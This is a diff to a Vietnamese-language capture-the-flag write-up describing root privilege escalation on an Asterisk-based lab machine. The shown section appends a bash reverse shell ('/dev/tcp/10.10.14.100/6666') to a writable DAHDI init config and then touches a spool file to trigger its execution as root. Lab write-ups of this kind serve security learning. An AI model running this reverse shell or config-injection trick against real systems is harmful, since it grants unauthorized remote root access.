@@ -32,7 +32,9 @@ Lỗ hổng bảo mật nghiêm trọng thực sự lộ diện khi tiến hành
 Kết quả trả về cho thấy tệp thuộc sở hữu của người dùng asterisk. Điều này cho phép chúng ta – với tư cách là user asterisk hiện tại – hoàn toàn có quyền chỉnh sửa hoặc chèn thêm mã độc vào cuối tệp cấu hình hệ thống.
 
 Sau đó sử dụng lệnh printf để chèn chuỗi mã độc reverse shell vào cuối file cấu hình init này. Sau đó sử dụng lệnh touch tác động trực tiếp vào vị trí thư mục giám sát để giả lập sự kiện hoàn tất ghi tệp. Và chúng ta đã leo được lên quyền root thành công và đọc file root.txt
+
 `printf '\nbash -i >& /dev/tcp/10.10.14.100/6666 0>&1\n' >> /etc/dahdi/init.conf`
+
 `touch /var/spool/asterisk/sysadmin/dahdi_restart`
 
 ![img](img/root.txt.png?raw=true)
